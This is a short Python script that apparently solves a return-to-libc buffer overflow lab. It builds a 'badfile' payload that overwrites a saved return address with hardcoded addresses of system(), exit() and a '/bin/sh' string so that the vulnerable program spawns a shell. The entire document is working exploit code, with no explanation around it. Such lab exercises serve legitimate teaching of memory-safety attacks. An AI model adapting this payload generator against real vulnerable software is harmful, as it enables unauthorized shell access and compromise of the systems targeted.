#!/usr/bin/python3
import sys

# runtime addresses you discovered
system_addr = 0xb7da4da0
exit_addr   = 0xb7d989d0
sh_addr     = 0xbffffefd

RET_OFFSET = 286
payload_len = RET_OFFSET + 12

content = bytearray(0xaa for _ in range(payload_len))

# restore saved EBP (required)
saved_ebp = 0xbffff348
content[RET_OFFSET-4:RET_OFFSET] = (saved_ebp).to_bytes(4, byteorder='little')

# system, exit, "/bin/sh" in little-endian
content[RET_OFFSET:RET_OFFSET+4]   = (system_addr).to_bytes(4, byteorder='little')
content[RET_OFFSET+4:RET_OFFSET+8] = (exit_addr).to_bytes(4, byteorder='little')
content[RET_OFFSET+8:RET_OFFSET+12]= (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
